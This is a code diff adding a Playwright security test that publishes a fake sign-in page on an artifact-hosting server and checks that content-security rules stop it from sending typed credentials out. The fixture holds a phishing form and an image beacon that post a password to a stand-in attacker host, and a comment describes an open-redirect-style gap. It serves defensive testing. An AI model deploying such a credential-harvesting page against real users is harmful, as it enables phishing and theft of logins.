@@ -195,3 +195,58 @@ async function readAttackResult(page: Page): Promise<AttackResult> {
   );
   return (await handle.jsonValue()) as AttackResult;
 }
+
+/**
+ * A page that looks like a sign-in and tries every way there is to get what
+ * somebody types into it back out.
+ *
+ * This is the abuse an open instance invites: not stealing the reader's session,
+ * but using a trusted domain to host a convincing fake and collect what a visitor
+ * types into it.
+ */
+const PHISHING_HTML = `<!doctype html>
+<html><body>
+<h1>Sign in to continue</h1>
+<form id="steal" method="POST" action="https://attacker.example/collect">
+  <input type="email" name="email" value="victim@example.com">
+  <input type="password" name="password" value="hunter2">
+  <button type="submit">Sign in</button>
+</form>
+<img id="beacon" src="https://attacker.example/pixel?p=hunter2">
+</body></html>`;
+
+test('a fake sign-in page cannot send what a visitor types anywhere', async ({
+  page,
+  context,
+}) => {
+  await server.signInBrowser(context);
+  const artifact = await server.publish({ type: 'html', content: PHISHING_HTML });
+
+  // Every request leaving for somewhere other than this server is recorded.
+  const escaped: string[] = [];
+  await page.route('**/*', async (route) => {
+    const url = route.request().url();
+    if (url.includes('attacker.example')) {
+      escaped.push(url);
+      await route.abort();
+      return;
+    }
+    await route.continue();
+  });
+
+  // Straight into a tab, which is how a phishing link would actually arrive.
+  await page.goto(`${server.baseUrl}/a/${artifact.slug}/content`);
+  await expect(page.locator('h1')).toHaveText('Sign in to continue');
+
+  await page.locator('#steal button').click().catch(() => undefined);
+  await page.waitForTimeout(500);
+
+  // form-action 'none' stops the post; img-src stops the beacon. So a fake
+  // sign-in page on this instance can be drawn, but cannot collect anything.
+  //
+  // Known gap, deliberately not asserted here because it is not yet closed: a
+  // link inside an artifact can still navigate the reader to another site when
+  // they click it. Nothing typed goes with them, but the instance can be used to
+  // make a hostile destination look like it came from this domain.
+  expect(escaped).toEqual([]);
+});
